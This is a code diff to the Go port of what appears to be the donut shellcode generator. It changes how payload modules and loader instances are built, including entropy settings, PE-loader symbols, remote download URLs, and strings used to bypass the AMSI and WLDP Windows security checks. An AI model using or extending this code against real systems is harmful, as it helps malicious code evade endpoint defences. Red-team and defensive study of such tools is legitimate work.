@@ -3,12 +3,10 @@ package donut
 import (
 	"bytes"
 	"encoding/binary"
-	"fmt"
 	"io/ioutil"
 	"log"
 	"path/filepath"
 	"strings"
-	"unicode/utf16"
 )
 
 /*
@@ -132,10 +130,9 @@ func Sandwich(arch DonutArch, payload *bytes.Buffer) (*bytes.Buffer, error) {
 		picLen += len(LOADER_EXE_X64)
 	}
 
-	// At the end, we pad with 0xCD "Clean Memory" bytes to mimic the behavior of the MSVC compiler used in donut.c
 	lb := w.Len()
 	for i := 0; i < picLen-lb; i++ {
-		w.WriteByte(0xCD)
+		w.WriteByte(0x0)
 	}
 
 	return w, nil
@@ -145,62 +142,52 @@ func Sandwich(arch DonutArch, payload *bytes.Buffer) (*bytes.Buffer, error) {
 func CreateModule(config *DonutConfig, inputFile *bytes.Buffer) error {
 
 	mod := new(DonutModule)
+	mod.ModType = uint32(config.Type)
+	mod.Thread = uint32(config.Thread)
+	mod.Ansi = uint32(config.Ansi)
+	mod.Compress = uint32(config.Compress)
 
 	if config.Type == DONUT_MODULE_NET_DLL ||
 		config.Type == DONUT_MODULE_NET_EXE {
-		if config.Domain == "" { // If no domain name specified, generate a random one
+		if config.Domain == "" && config.Entropy != DONUT_ENTROPY_NONE { // If no domain name specified, generate a random one
 			config.Domain = RandomString(DONUT_DOMAIN_LEN)
+		} else {
+			config.Domain = "AAAAAAAA"
 		}
-		wstr := utf16.Encode([]rune(config.Domain))
-		for i, r := range wstr {
-			mod.Domain[i] = r
-		}
+		copy(mod.Domain[:], []byte(config.Domain)[:])
+
 		if config.Type == DONUT_MODULE_NET_DLL {
 			log.Println("Class:", config.Class)
-			wstr = utf16.Encode([]rune(config.Class))
-			for i, r := range wstr {
-				mod.Cls[i] = r
-			}
+			copy(mod.Cls[:], []byte(config.Class)[:])
 			log.Println("Method:", config.Method)
-			wstr = utf16.Encode([]rune(config.Method))
-			b := bytes.NewBuffer([]byte{})
-			for _, r := range wstr {
-				binary.Write(b, binary.LittleEndian, r)
-			}
-			copy(mod.Method[:], b.Bytes())
+			copy(mod.Method[:], []byte(config.Method)[:])
 		}
 		// If no runtime specified in configuration, use default
 		if config.Runtime == "" {
 			config.Runtime = "v2.0.50727"
 		}
 		log.Println("Runtime:", config.Runtime)
-		wstr = utf16.Encode([]rune(config.Runtime))
-		for i, r := range wstr {
-			mod.Runtime[i] = r
-		}
+		copy(mod.Runtime[:], []byte(config.Runtime)[:])
 	} else if config.Type == DONUT_MODULE_DLL && config.Method == "" { // Unmanaged DLL? check for exported api
 		log.Println("DLL function:", config.Method)
 		copy(mod.Method[:], []byte(config.Method))
 	}
-
-	mod.ModType = uint32(config.Type)
-	mod.Len = uint64(inputFile.Len())
+	mod.Zlen = 0 // todo: support compression
+	mod.Len = uint32(inputFile.Len())
 
 	if config.Parameters != "" {
-		params := strings.FieldsFunc(config.Parameters, func(r rune) bool { return r == ',' || r == ';' })
-		for i, p := range params {
-			if i >= DONUT_MAX_PARAM {
-				return fmt.Errorf("Parameter Index(%v) exceeds DONUT_MAX_PARAM(%v)", i, DONUT_MAX_PARAM)
-			} else if len(p) >= DONUT_MAX_NAME {
-				return fmt.Errorf("Parameter: %s exceeds DONUT_MAX_NAME(%v)", p, DONUT_MAX_PARAM)
+		// if type is unmanaged EXE
+		if config.Type == DONUT_MODULE_EXE {
+			// and entropy is enabled
+			if config.Entropy != DONUT_ENTROPY_NONE {
+				// generate 4-byte random name
+				copy(mod.Param[:], []byte(RandomString(4) + " ")[:])
+			} else {
+				// else set to "AAAA "
+				copy(mod.Param[:], []byte("AAAA ")[:])
 			}
-			log.Println("Adding parameter:", p)
-			wstr := utf16.Encode([]rune(p))
-			for j, r := range wstr {
-				mod.Param[i][j] = r
-			}
-			mod.ParamCount = uint32(i) + 1
 		}
+		copy(mod.Param[5:], []byte(config.Parameters)[:])
 	}
 
 	// read module into memory
@@ -219,7 +206,7 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 
 	inst := new(DonutInstance)
 	modLen := uint32(config.ModuleData.Len()) // ModuleData is mod struct + input file
-	instLen := uint32(8312 + 8)               //todo: that's how big it is in the C version...
+	instLen := uint32(3312 + 8)               //todo: that's how big it is in the C version...
 	inst.Bypass = uint32(config.Bypass)
 
 	// if this is a PIC instance, add the size of module
@@ -229,7 +216,7 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 		instLen += modLen
 	}
 
-	if !config.NoCrypto {
+	if config.Entropy == DONUT_ENTROPY_DEFAULT {
 		log.Println("Generating random key for instance")
 		tk, err := GenerateRandomBytes(16)
 		if err != nil {
@@ -280,13 +267,15 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 	// save how many API to resolve
 	inst.ApiCount = uint32(len(api_imports))
 	inst.DllCount = 0
-	copy(inst.DllName[inst.DllCount][:], []byte("ole32.dll"))
+	copy(inst.DllName[inst.DllCount][:], "ole32.dll")
 	inst.DllCount++
-	copy(inst.DllName[inst.DllCount][:], []byte("oleaut32.dll"))
+	copy(inst.DllName[inst.DllCount][:], "oleaut32.dll")
 	inst.DllCount++
-	copy(inst.DllName[inst.DllCount][:], []byte("wininet.dll"))
+	copy(inst.DllName[inst.DllCount][:], "wininet.dll")
 	inst.DllCount++
-	copy(inst.DllName[inst.DllCount][:], []byte("mscoree.dll"))
+	copy(inst.DllName[inst.DllCount][:], "mscoree.dll")
+	inst.DllCount++
+	copy(inst.DllName[inst.DllCount][:], "shell32.dll")
 	inst.DllCount++
 
 	// if module is .NET assembly
@@ -312,53 +301,78 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 		copy(inst.XIID_IActiveScriptParse32[:], xIID_IActiveScriptParse32[:])
 		copy(inst.XIID_IActiveScriptParse64[:], xIID_IActiveScriptParse64[:])
 
-		wstr := utf16.Encode([]rune("WScript"))
-		for j, r := range wstr {
-			inst.Wscript[j] = r
-		}
-		wstr = utf16.Encode([]rune("wscript.exe"))
-		for j, r := range wstr {
-			inst.Wscript_exe[j] = r
-		}
+		copy(inst.Wscript[:], "WScript")
+		copy(inst.Wscript_exe[:], "wscript.exe")
 
 		if config.Type == DONUT_MODULE_VBS {
 			copy(inst.XCLSID_ScriptLanguage[:], xCLSID_VBScript[:])
 		} else {
 			copy(inst.XCLSID_ScriptLanguage[:], xCLSID_JScript[:])
 		}
-	} else if config.Type == DONUT_MODULE_XSL {
-		log.Println("Copying GUID structures for loading XSL to instance")
-		copy(inst.XCLSID_DOMDocument30[:], xCLSID_DOMDocument30[:])
-		copy(inst.XIID_IXMLDOMDocument[:], xIID_IXMLDOMDocument[:])
-		copy(inst.XIID_IXMLDOMNode[:], xIID_IXMLDOMNode[:])
 	}
+
 	// required to disable AMSI
-	copy(inst.S[:], "AMSI")
+	copy(inst.Clr[:], "clr")
+	copy(inst.Amsi[:], "amsi")
 	copy(inst.AmsiInit[:], "AmsiInitialize")
 	copy(inst.AmsiScanBuf[:], "AmsiScanBuffer")
 	copy(inst.AmsiScanStr[:], "AmsiScanString")
 
-	copy(inst.Clr[:], "CLR")
+	// stuff for PE loader
+	copy(inst.Dataname[:], ".data")
+	copy(inst.Kernelbase[:], "kernelbase")
+
+	// ansi symbols
+	copy(inst.Acmdln[:], "_acmdln")
+	copy(inst.Pacmdln[:], "__p__acmdln")
+	copy(inst.Argv[:], "__argv")
+	copy(inst.Pargv[:], "__p___argv")
+
+	// unicode symbols
+	copy(inst.Wcmdln[:], "_wcmdln")
+	copy(inst.Pwcmdln[:], "__p__wcmdln")
+	copy(inst.Wargv[:], "__wargv")
+	copy(inst.Pwargv[:], "__p___wargv")
+
+	copy(inst.Exitproc1[:], "ExitProcess")
+	copy(inst.Exitproc2[:], "exit")
+	copy(inst.Exitproc3[:], "_exit")
+	copy(inst.Exitproc4[:], "_cexit")
+	copy(inst.Exitproc5[:], "_c_exit")
+	copy(inst.Exitproc6[:], "quick_exit")
+	copy(inst.Exitproc7[:], "_Exit")
 
 	// required to disable WLDP
-	copy(inst.Wldp[:], "WLDP")
+	copy(inst.Wldp[:], "wldp")
 	copy(inst.WldpQuery[:], "WldpQueryDynamicCodeTrust")
 	copy(inst.WldpIsApproved[:], "WldpIsClassInApprovedList")
 
 	// set the type of instance we're creating
 	inst.Type = uint32(int(config.InstType))
 
+	// indicate if we should call RtlExitUserProcess to terminate host process
+	inst.ExitOpt = config.ExitOpt
+	// set the fork option
+	inst.Fork = config.Fork
+	// set the entropy level
+	inst.Entropy = config.Entropy
+
 	// if the module will be downloaded
 	// set the URL parameter and request verb
 	if inst.Type == DONUT_INSTANCE_URL {
-		// generate a random name for module
-		// that will be saved to disk
-		config.ModuleName = RandomString(DONUT_MAX_MODNAME)
-		log.Println("Generated random name for module :", config.ModuleName)
+		if config.ModuleName != "" {
+			if config.Entropy != DONUT_ENTROPY_NONE {
+				// generate a random name for module
+				// that will be saved to disk
+				config.ModuleName = RandomString(DONUT_MAX_MODNAME)
+				log.Println("Generated random name for module :", config.ModuleName)
+			} else {
+				config.ModuleName = "AAAAAAAA"
+			}
+		}
 		log.Println("Setting URL parameters")
 		// append module name
 		copy(inst.Url[:], config.URL+"/"+config.ModuleName)
-
 		// set the request verb
 		copy(inst.Req[:], "GET")
 		log.Println("Payload will attempt download from:", string(inst.Url[:]))
@@ -369,30 +383,23 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 	config.inst = inst
 	config.instLen = instLen
 
-	if config.InstType == DONUT_INSTANCE_URL {
+	if config.InstType == DONUT_INSTANCE_URL && config.Entropy == DONUT_ENTROPY_DEFAULT {
 		log.Println("encrypting module for download")
 		config.ModuleMac = Maru(inst.Sig[:], inst.Iv[:])
-
-		if !config.NoCrypto {
-			config.ModuleData = Encrypt(
-				inst.ModKeyMk[:],
-				inst.ModKeyCtr[:],
-				config.ModuleData.Bytes(),
-				uint32(config.ModuleData.Len()))
-		}
+		config.ModuleData = Encrypt(
+			inst.ModKeyMk[:],
+			inst.ModKeyCtr[:],
+			config.ModuleData.Bytes(),
+			uint32(config.ModuleData.Len()))
 		b := new(bytes.Buffer)
 		inst.Len = instLen - 8 /* magic padding */
 		inst.WriteTo(b)
 		for uint32(b.Len()) < instLen-16 /* magic padding */ {
 			b.WriteByte(0)
 		}
-
 		return b, nil
 	}
 	// else if config.InstType == DONUT_INSTANCE_PIC
-	if !config.NoCrypto {
-		inst.Mac = Maru(inst.Sig[:], inst.Iv[:])
-	}
 	b := new(bytes.Buffer)
 	inst.WriteTo(b)
 	if _, err := config.ModuleData.WriteTo(b); err != nil {
@@ -401,9 +408,10 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 	for uint32(b.Len()) < config.instLen {
 		b.WriteByte(0)
 	}
-	if config.NoCrypto {
+	if config.Entropy != DONUT_ENTROPY_DEFAULT {
 		return b, nil
 	}
+	inst.Mac = Maru(inst.Sig[:], inst.Iv[:])
 	log.Println("encrypting instance")
 	instData := b.Bytes()
 	offset := 4 + // Len uint32
